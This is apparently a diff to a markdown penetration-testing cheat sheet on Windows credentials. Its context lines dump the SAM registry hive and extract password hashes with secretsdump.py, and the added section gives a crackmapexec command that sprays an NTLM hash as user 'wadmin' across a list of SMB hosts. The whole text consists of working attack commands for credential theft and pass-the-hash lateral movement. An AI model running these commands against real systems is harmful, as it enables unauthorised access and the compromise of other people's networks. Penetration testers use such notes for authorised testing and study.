@@ -41,3 +41,9 @@ reg save HKLM\SAM C:\Temp\SAM
 # download via smbclient
 secretsdump.py -sam ./SAM -system ./SYSTEM LOCAL
 ```
+
+### NTLM Hash spray
+
+```
+crackmapexec smb sambas.txt  -u wadmin -H aad3b435b51404eeaad3b435b51404ee:<HASH> | grep -a '[+]'
+```
